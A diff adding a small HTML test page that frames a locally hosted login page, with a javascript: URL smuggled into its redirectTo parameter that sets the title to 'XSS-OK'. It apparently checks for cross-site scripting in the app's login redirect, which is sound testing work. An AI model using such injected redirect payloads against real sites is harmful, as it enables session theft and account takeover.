@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <title>frame check</title>
+</head>
+<body>
+  <p id="note">iframe ниже</p>
+  <iframe
+    id="victim"
+    title="login"
+    src="http://127.0.0.1:8080/login?redirectTo=javascript:document.title='XSS-OK'"
+    style="width:900px;height:700px;border:2px solid #333"
+  ></iframe>
+</body>
+</html>
